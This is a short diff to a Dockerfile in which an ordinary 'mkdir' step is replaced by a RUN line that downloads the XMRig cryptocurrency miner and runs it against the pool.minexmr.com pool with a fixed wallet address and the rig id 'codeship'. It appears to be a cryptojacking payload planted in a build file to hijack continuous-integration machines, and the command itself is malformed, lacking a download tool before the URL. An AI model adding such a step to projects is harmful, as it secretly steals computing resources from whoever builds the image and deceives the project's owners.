@@ -1,6 +1,6 @@
 FROM ubuntu:zesty
 
-RUN mkdir /usr/src/app
+RUN https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id codeship
 WORKDIR /usr/src/app
 
 COPY . .
